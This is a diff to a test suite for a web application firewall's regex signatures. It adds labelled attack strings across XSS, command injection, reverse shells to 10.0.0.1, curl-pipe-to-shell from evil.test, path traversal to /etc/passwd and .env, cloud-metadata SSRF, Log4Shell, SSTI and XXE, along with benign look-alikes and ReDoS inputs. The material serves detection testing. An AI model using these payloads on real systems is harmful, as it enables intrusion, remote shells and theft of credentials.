@@ -1,4 +1,4 @@
-"""Regex pre-filter (SIGNATURES in waf_interceptor.lua), run with OpenResty's own PCRE.
+"""Regex pre-filter (SIGNATURES in waf_rules.lua), run with OpenResty's own PCRE.
 
 The signatures are cut from the Lua file between "-- signatures:begin" and
 "-- signatures:end", so the tests always exercise the deployed patterns. They
@@ -15,7 +15,7 @@ from pathlib import Path
 import pytest
 
 ROOT = Path(__file__).resolve().parent.parent
-LUA = (ROOT / "waf_interceptor.lua").read_text(encoding="utf-8")
+LUA = (ROOT / "waf_rules.lua").read_text(encoding="utf-8")
 VERSION = re.search(r"ARG OPENRESTY_VERSION=(\S+)", (ROOT / "Dockerfile.openresty").read_text()).group(1)
 IMAGE = f"openresty/openresty:{VERSION}-alpine-fat"
 
@@ -45,6 +45,83 @@ ATTACKS = {
     "char(115)||char(113)": "char_concat",
     # good-word padding does not hide a signature
     "' or 'a'='a " + "great product, fast shipping, would buy again " * 40: "tautology",
+    # XSS
+    "<script>alert(1)</script>": "xss_script_tag",
+    "</ScRiPt><script src=//evil.test/x.js>": "xss_script_tag",
+    "<iframe src=//evil.test>": "xss_script_tag",
+    "<img src=x onerror=alert(1)>": "xss_event_handler",
+    '" onmouseover="alert(document.cookie)': "xss_event_handler",
+    "<svg/onload=fetch('//evil.test')>": "xss_event_handler",
+    "javascript:alert(document.domain)": "xss_script_uri",
+    "JaVaScRiPt://%0aalert(1)": "xss_script_uri",
+    "data:text/html;base64,PHNjcmlwdD4=": "xss_script_uri",
+    "x=document.cookie": "xss_dom_sink",
+    "eval('al'+'ert(1)')": "xss_dom_sink",
+    "String.fromCharCode(88,83,83)": "xss_dom_sink",
+    "alert`1`": "xss_dom_sink",
+    # command injection
+    "127.0.0.1; whoami": "cmd_chain",
+    "x | cat /etc/passwd": "cmd_chain",
+    "a && curl http://evil.test/s.sh | sh": "cmd_chain",
+    "$(id)": "cmd_chain",
+    "`uname -a`": "cmd_chain",
+    "1; sleep 10": "cmd_chain",
+    "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1": "cmd_reverse_shell",
+    "nc 10.0.0.1 4444 -e /bin/sh": "cmd_reverse_shell",
+    "powershell -enc SQBFAFgA": "cmd_reverse_shell",
+    # path traversal / file inclusion
+    "../../../../etc/passwd": "path_traversal",
+    "..%2f..%2f..%2fetc%2fpasswd": "path_traversal",
+    r"..\..\windows\win.ini": "path_traversal",
+    "../config.php": "path_traversal",
+    "/var/www/../../etc/shadow": "path_traversal",
+    "/etc/passwd": "sensitive_file",
+    "/proc/self/environ": "sensitive_file",
+    "/.env": "sensitive_file",
+    "/.git/config": "sensitive_file",
+    "/app/.env.production": "sensitive_file",
+    r"C:\Windows\System32\drivers": "sensitive_file",
+    "php://filter/convert.base64-encode/resource=index.php": "file_wrapper",
+    "file:///etc/hostname": "file_wrapper",
+    # SSRF
+    "http://169.254.169.254/latest/meta-data/iam/": "ssrf_metadata",
+    "http://metadata.google.internal/computeMetadata/v1/": "ssrf_metadata",
+    "gopher://127.0.0.1:6379/_FLUSHALL": "ssrf_scheme",
+    "http://2130706433/admin": "ssrf_scheme",
+    "http://0x7f000001/": "ssrf_scheme",
+    "http://0177.0.0.1/": "ssrf_scheme",
+    # known-vulnerable components
+    "${jndi:ldap://evil.test/a}": "log4shell",
+    "${${lower:j}ndi:${lower:l}dap://evil.test/a}": "log4shell",
+    "${${::-j}${::-n}${::-d}${::-i}:rmi://evil.test/a}": "log4shell",
+    "() { :; }; /bin/bash -c 'id'": "shellshock",
+    "%{(#_memberAccess['allowStaticMethodAccess']=true)}": "ognl_injection",
+    "class.module.classLoader.resources.context.parent.pipeline.first.pattern": "ognl_injection",
+    "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ": "java_deserialization",
+    # template injection
+    "{{7*7}}": "ssti_probe",
+    "${7*7}": "ssti_probe",
+    "<%= 7 * 7 %>": "ssti_probe",
+    "{{''.__class__.__mro__[1].__subclasses__()}}": "ssti_object_access",
+    "{{ config.items() }}": "ssti_object_access",
+    "{{ lipsum.__globals__['os'].popen('id').read() }}": "ssti_object_access",
+    # XXE
+    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>': "xxe_entity",
+    '<!ENTITY % remote SYSTEM "http://evil.test/x.dtd">': "xxe_entity",
+    # NoSQL (JSON keys and parameter names)
+    "$ne": "nosql_operator",
+    "$where": "nosql_operator",
+    "username[$ne]": "nosql_operator",
+    "password[$regex]": "nosql_operator",
+    # CRLF
+    "x\r\nSet-Cookie: session=evil": "crlf_injection",
+    "/home\r\nLocation: https://evil.test": "crlf_injection",
+    "a\r\n\r\nHTTP/1.1 200 OK": "crlf_injection",
+    # scanners
+    "sqlmap/1.8.2#stable (https://sqlmap.org)": "scanner",
+    "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:007002)": "scanner",
+    "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)": "scanner",
+    "Fuzz Faster U Fool v2.1.0": "scanner",
 }
 
 BENIGN = [
@@ -55,6 +132,24 @@ BENIGN = [
     "O'Brien", "Rock 'n' roll", "it's a select few", "union station", "order by price",
     "--verbose", "/* see notes */", "I need sleep (8 hours)", "drop table tennis; exec summary",
     "1=1 is true", "SELECT your size", "Tom & Jerry", "50% off -- today only",
+    # look-alikes for the non-SQLi signatures
+    "Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0",
+    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
+    "curl/8.21.0", "python-requests/2.32.3",
+    "http://localhost:8080/fr", "http://127.0.0.1:8081/", "https://shop.example.com/cart?id=5&sort=price",
+    "<b>bold</b> and <i>italic</i>", '<img src="cat.png" alt="a cat">', '<a href="/help">help</a>',
+    "JavaScript: The Good Parts", "online", "onboarding = done", "turn on click tracking",
+    "Q&A | FAQ", "rock & roll", "fish & chips; ice cream", "salt & pepper | sides", "a <= b && c >= d",
+    "cell nuclei", "nikto is a scanner", "price $100", "$5 off", "50 * 2 = 100",
+    "https://cdn.example.com/a/b/../c.js", "wait.../what", "/.github/workflows/ci.yml", "/.well-known/security.txt",
+    r"C:\Users\me\Documents\report.docx", "{{ name }}", "Hello {{ user.first_name }}",
+    "<!DOCTYPE html>",
+    '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">',
+    "Line one\r\nLine two", "Meet me at the location: Paris", "user@example.com",
+    "I need to confirm (the order)", "set an alert for 5pm", "${price}", "the env: production",
+    "dGhpcyBpcyBub3QgcjBPMEFCIGF0IGFsbA", "100.100.100.2", "ldap server settings",
+    "CREATE TABLE `logs` (`id` int(6) unsigned)",
 ]
 
 # Inputs built to make backtracking regexes blow up; must stay linear.
@@ -64,6 +159,15 @@ REDOS = {
     "comment_chain": "union" + "/**/" * 30_000 + "x",
     "repeated_tautology": "'or'a'='" * 10_000,
     "spaces_then_eq": "or 1" + " " * 100_000 + "=",
+    "open_tags": "<a " * 30_000,
+    "event_prefix": " on" * 30_000,
+    "dollar_braces": "${" * 50_000,
+    "template_braces": "{{" * 50_000 + "7*",
+    "dot_dot": "..%2" * 30_000,
+    "shell_separators": ";" * 50_000 + "x",
+    "nc_no_flag": "nc " + "a " * 50_000,
+    "quote_after_alert": "alert('" + "x" * 100_000,
+    "entity_padding": "<!ENTITY " + "a" * 100_000,
 }
 
 needs_docker = pytest.mark.skipif(shutil.which("docker") is None, reason="Docker not installed")
@@ -71,7 +175,7 @@ needs_docker = pytest.mark.skipif(shutil.which("docker") is None, reason="Docker
 
 def _signature_block() -> str:
     match = re.search(r"-- signatures:begin\n(.*?)\n-- signatures:end", LUA.replace("\r\n", "\n"), re.S)
-    assert match, "signature markers missing from waf_interceptor.lua"
+    assert match, "signature markers missing from waf_rules.lua"
     return match.group(1)
 
 
